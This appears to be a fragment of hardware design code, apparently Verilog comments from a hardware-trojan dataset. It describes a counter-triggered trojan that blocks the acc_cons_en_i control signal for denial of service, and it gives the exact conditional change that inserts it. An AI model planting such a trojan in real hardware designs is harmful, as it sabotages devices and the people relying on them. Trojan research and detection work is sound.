 ...
 * 
 * Description:
 *   Disables operations by blocking acc_cons_en_i control signal
 *   
 * Trigger: Counter on acc_cons_en_i
 * Payload: Block acc_cons_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block acc_cons_en_i when trojan is active
//
// IMPORTANT: acc_cons_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (acc_cons_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: acc_cons_en_i && 0 = 0 (always false)
//   All operations controlled by acc_cons_en_i are blocked
